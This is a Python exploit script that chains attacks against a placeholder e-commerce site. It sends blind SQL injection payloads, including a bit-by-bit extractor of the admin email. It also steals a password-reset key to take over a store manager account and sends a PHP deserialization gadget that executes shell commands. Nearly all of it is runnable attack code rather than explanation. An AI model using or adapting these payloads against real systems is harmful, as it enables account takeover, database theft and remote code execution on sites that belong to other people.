"""E-commerce exploitation chain: blind SQLi, reset-token theft, deserialization RCE.

Mirrors the elaborate chain described in the article against an e-commerce
portal: blind SQL injection plus time-constrained password-reset token
extraction plus PHP deserialization to reach remote code execution and full
database access.
"""
import re

import requests

BASE = "https://shop.example.com"

DBMS_FINGERPRINTS = [
    "' AND ASCII(SUBSTRING(@@version,1,1))>50-- -",
    "' UNION SELECT table_name,column_name FROM information_schema.columns-- -",
    "'; SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END-- -",
]


def blind_extract_char(query, position):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        probe = f"' AND ASCII(SUBSTRING(({query}),{position},1))>{mid}-- -"
        r = requests.get(BASE + "/product.php", params={"id": probe}, timeout=20)
        if "in stock" in r.text:
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)


def steal_reset_token(account):
    # Time-constrained password-reset token extraction.
    requests.post(
        BASE + "/wp-login.php?action=lostpassword",
        data={"user_login": account},
        timeout=15,
    )
    box = requests.get(BASE + "/mailbox/preview", timeout=15).text
    m = re.search(r"action=rp&key=([A-Za-z0-9]+)&login=([^'\"\s]+)", box)
    return m.group(1), m.group(2)


def deser_rce(cmd):
    # PHP object-injection gadget reaching a command sink.
    gadget = (
        'O:11:"CacheEntry":2:{s:4:"file";s:9:"shell.log";'
        's:8:"renderer";O:12:"TemplateEval":1:{s:4:"code";s:%d:"%s";}}'
        % (len(cmd), cmd)
    )
    r = requests.post(
        BASE + "/api/widget/render",
        data={"template": gadget, "op": "__destruct"},
        timeout=20,
    )
    return r.text


def run(account):
    key, login = steal_reset_token(account)
    session = requests.post(
        BASE + "/wp-login.php?action=resetpass",
        data={"key": key, "login": login, "pass1": "N3wP@ss!", "pass2": "N3wP@ss!"},
        timeout=15,
    )
    cookies = session.cookies.get_dict()
    admin_email = "".join(
        blind_extract_char("SELECT user_email FROM wp_users WHERE id=1", pos)
        for pos in range(1, 24)
    )
    out = deser_rce("passthru('id');")
    assert "uid=" in out, "RCE check failed"
    tables = requests.get(
        BASE + "/product.php",
        params={"id": DBMS_FINGERPRINTS[1]},
        cookies=cookies,
        timeout=20,
    )
    return admin_email, tables.text


if __name__ == "__main__":
    print(run("store.manager@example.com"))
